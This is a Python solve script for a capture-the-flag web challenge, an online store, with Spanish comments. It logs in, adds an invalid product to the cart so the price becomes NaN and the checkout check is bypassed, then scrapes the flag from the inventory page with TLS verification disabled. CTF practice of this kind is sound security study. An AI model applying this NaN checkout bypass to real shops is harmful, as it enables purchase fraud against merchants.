#!/usr/bin/env python3
import requests, urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://zazastore.ctf.pascalctf.it"
s = requests.Session()
s.verify = False

# Login para obtener sesión
s.post(f"{URL}/login", json={"username": "user", "password": "pass"})

# Exploit: NaN bypass
s.post(f"{URL}/add-cart", json={"product": "RealZa", "quantity": 1})
s.post(f"{URL}/add-cart", json={"product": "InvalidProduct", "quantity": 1})
s.post(f"{URL}/checkout", json={})

# Extraer flag del inventario
r = s.get(f"{URL}/inventory")
soup = BeautifulSoup(r.text, 'html.parser')

for item in soup.find_all('div', class_='inventory-item'):
    h2 = item.find('h2')
    content = item.find('div', class_='content-value')
    if h2 and content and 'RealZa' in h2.text:
        flag = content.text.strip()
        print(f"Flag: {flag}")
        break
